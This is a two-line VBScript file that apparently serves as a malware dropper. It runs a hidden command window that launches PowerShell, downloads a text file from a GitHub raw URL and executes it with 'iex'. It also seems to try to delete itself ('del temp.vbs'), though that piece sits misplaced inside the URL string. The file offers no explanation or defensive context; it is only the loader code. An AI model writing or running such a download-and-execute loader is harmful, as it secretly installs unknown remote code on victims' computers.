Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c powershell -Command $command = ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/NE1W01F/EXE/master/wow.txt & del temp.vbs'));iex $command;", 0
